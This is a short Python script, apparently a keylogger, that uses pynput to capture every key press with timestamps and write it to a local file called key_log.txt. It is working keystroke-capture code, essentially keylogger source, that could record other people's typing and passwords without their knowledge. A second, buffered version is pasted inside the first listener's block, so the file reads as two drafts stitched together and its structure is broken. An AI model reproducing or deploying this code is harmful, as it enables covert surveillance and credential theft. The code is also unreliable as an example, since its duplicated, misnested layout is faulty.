import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    from pynput import keyboard
    import time
    
    # Set up logging
    logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
    
    # Buffer to hold keystrokes
    keystroke_buffer = []
    last_time = time.time()
    
    def log_keystrokes():
        global last_time
        current_time = time.time()
        
        # Check if the time since the last log is less than 0.5 seconds
        if current_time - last_time < 0.5:
            return  # Skip logging to group keystrokes
        else:
            if keystroke_buffer:
                logging.info(' '.join(keystroke_buffer))
                keystroke_buffer.clear()  # Clear the buffer after logging
                last_time = current_time  # Update last log time
    
    def on_press(key):
        try:
            keystroke_buffer.append(key.char)  # Add the character to the buffer
        except AttributeError:
            keystroke_buffer.append(str(key))  # Log special keys as strings
        log_keystrokes()  # Log the buffer if conditions are met
    
    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False
    
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()